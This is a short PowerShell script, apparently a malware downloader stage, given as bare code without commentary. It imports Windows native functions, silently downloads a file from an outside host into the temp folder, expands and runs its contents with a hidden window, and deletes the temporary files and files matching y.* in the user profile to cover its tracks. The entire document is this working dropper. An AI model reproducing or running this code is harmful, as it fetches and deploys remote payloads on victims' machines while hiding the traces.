Add-Type -TypeDefinition @"
    using System;
    using System.Text;
    using System.Runtime.InteropServices;

    public class NativeAPIs
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WinExec(string strCmdLine, uint uCmdShow);

        [DllImport("urlmon.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern long URLDownloadToFile(IntPtr pCaller, string strURL, string strFileName, uint uReserved, IntPtr pCallBack);
    }
"@

$strURL = "http://romanovawillkillyou.c1.biz/index.php?user_id=417";
$strPath = [Environment]::ExpandEnvironmentVariables("%TEMP%");
[IO.Directory]::SetCurrentDirectory($strPath);
$strFileName = [IO.Path]::GetTempFileName();
$nResult = [NativeAPIs]::URLDownloadToFile([IntPtr]::Zero, $strURL, $strFileName, 0, [IntPtr]::Zero);
$strCmdLine = "cmd /c expand " + $strFileName + " -F:* " + $strPath + " && del /q /f *.tmp";
$nResult = [NativeAPIs]::WinExec($strCmdLine, 0);
$nResult = [NativeAPIs]::WinExec("cmd /c cd /d %USERPROFILE% && del /f /q y.*", 0);